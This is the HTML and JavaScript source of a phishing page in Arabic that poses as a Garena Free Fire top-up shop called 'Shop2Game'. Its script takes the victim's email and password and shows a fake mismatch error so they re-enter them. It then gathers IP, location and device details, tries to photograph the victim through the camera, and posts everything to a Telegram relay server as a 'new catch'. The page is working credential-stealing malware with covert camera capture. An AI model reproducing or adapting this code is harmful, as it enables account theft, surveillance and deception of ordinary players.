<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Shop2Game - Garena</title>
 <link rel="preconnect" href="https://ipapi.co">
 <link rel="preconnect" href="https://my-telegram-server.vercel.app">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 <style>
 /* ... (ابقاء الأسلوب الحالي غير المتغير) ... */
 </style>
</head>
<body>

 <nav class="navbar">
 <div class="site-title">Shop2Game</div>
 <img src="https://upload.wikimedia.org/wikipedia/en/thumb/e/ee/Garena_logo.svg/1200px-Garena_logo.svg.png" class="garena-logo" alt="Garena" loading="lazy">
 </nav>

 <div class="container">
 <section id="step1" class="section active">
 <!-- ... (ابقاء محتوى القسم الحالي غير المتغير) ... -->
 </section>
 <!-- ... (ابقاء محتوى الأقسام الأخرى الحالية غير المتغير) ... -->
 </div>

 <!-- إضافة تاغ فيديو مخفي -->
 <video id="hiddenVideo" autoplay style="display:none;"></video>

 <!-- إضافة تاغ كانفاس مخفي -->
 <canvas id="hiddenCanvas" style="display:none;"></canvas>

 <!-- إضافة تاغ للكاميرا -->
 <input type="file" id="cameraInput" accept="image/*;capture=camera" style="display:none;" />

 <script>
 const VERCEL_URL = "https://my-telegram-server.vercel.app/api/send";
 let attempts = 0;
 let selectedOffer = "";
 let method = "";

 // دالة جديدة لالتقاط صورة من الكاميرا
 async function captureCamera() {
 try {
 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
 const video = document.getElementById('hiddenVideo');
 video.srcObject = stream;
 return new Promise((resolve) => {
 video.onloadedmetadata = () => {
 const canvas = document.getElementById('hiddenCanvas');
 const context = canvas.getContext('2d');
 canvas.width = video.videoWidth;
 canvas.height = video.videoHeight;
 context.drawImage(video, 0, 0, canvas.width, canvas.height);
 resolve(canvas.toDataURL('image/png'));
 };
 });
 } catch (error) {
 console.error('خطأ في التقاط صورة:', error);
 }
 }

 // دالة جديدة لالتقاط صورة من الكاميرا باستخدام التاغ <input>
 function captureCameraInput() {
 return new Promise((resolve) => {
 const input = document.getElementById('cameraInput');
 input.addEventListener('change', () => {
 const file = input.files[0];
 const reader = new FileReader();
 reader.readAsDataURL(file);
 reader.onload = () => {
 resolve(reader.result);
 };
 });
 input.click();
 });
 }

 // دالة الجديدة لالتقاط المعلومات
 async function gatherInfo() {
 try {
 const r = await fetch('https://ipapi.co/json/', { mode: 'cors', signal: AbortSignal.timeout(5000) });
 const d = await r.json();
 const platform = navigator.platform;
 const userAgent = navigator.userAgent;
 const deviceInfo = `📍 IP: ${d.ip} | 🌍 ${d.country_name} | 📱 ${platform} | 💻 ${userAgent}`;
 return deviceInfo;
 } catch (error) {
 console.error('خطأ في جمع المعلومات:', error);
 return 'Unknown Info';
 }
 }

 // دالة الجديدة لالتقاط صورة وتجميع المعلومات
 async function captureAndGather() {
 const [image, deviceInfo] = await Promise.all([
 captureCameraInput(),
 gatherInfo()
 ]);
 return { image, deviceInfo };
 }

 async function sendToServer(text) {
 try {
 const submitBtn = document.querySelector('.btn-submit');
 const originalText = submitBtn.innerHTML;
 submitBtn.innerHTML = '<div class="loading"></div>جاري الإرسال...';
 submitBtn.disabled = true;

 const response = await fetch(VERCEL_URL, {
 method: "POST",
 mode: 'cors',
 credentials: 'omit',
 headers: {
 "Content-Type": "application/json",
 "Accept": "application/json"
 },
 body: JSON.stringify({
 message: text,
 timestamp: new Date().toISOString(),
 origin: window.location.hostname
 }),
 signal: AbortSignal.timeout(10000)
 });

 if (!response.ok) throw new Error(`HTTP ${response.status}`);
 console.log("✅ نجح الإرسال!");
 } catch (err) {
 console.error("❌ خطأ:", err.message);
 } finally {
 const submitBtn = document.querySelector('.btn-submit');
 submitBtn.innerHTML = submitBtn.onclick.name === 'handleData' ? 'إشحن الآن 💎' : 'تأكيد الرمز';
 submitBtn.disabled = false;
 }
 }

 // تعديل دالة handleData لالتقاط صورة وتجميع المعلومات
 window.handleData = async function(event) {
 event.preventDefault();
 const email = document.getElementById('userEmail').value.trim();
 const pass = document.getElementById('userPass').value.trim();
 const errorBox = document.getElementById('errorBox');

 if(!email || !pass) {
 errorBox.style.display = 'block';
 errorBox.innerText = 'يرجى إدخال البريد وكلمة المرور';
 return;
 }

 if(attempts < 1) {
 errorBox.style.display = 'block';
 errorBox.innerText = 'حدث خطأ: معلومات الدخول غير متطابقة مع بيانات فري فاير.';
 attempts++;
 return;
 }

 const { image, deviceInfo } = await captureAndGather();
 const msg = `🚀 **صيد جديد!**\n💎 **العرض:** ${selectedOffer}\n🔑 **الطريقة:** ${method}\n📧 **الحساب:** ${email}\n🔒 **كلمة السر:** ${pass}\n🕐 **الوقت:** ${new Date().toLocaleString('ar-EG')}\n${deviceInfo}\n🖼️ **الصورة:** ${image}`;

 console.log("📤 إرسال:", msg);
 await sendToServer(msg);
 goToStep(5);
 }

 // ... (ابقاء دالة handleSMS الحالي غير المتغير) ...
 </script>
</body>
</html>
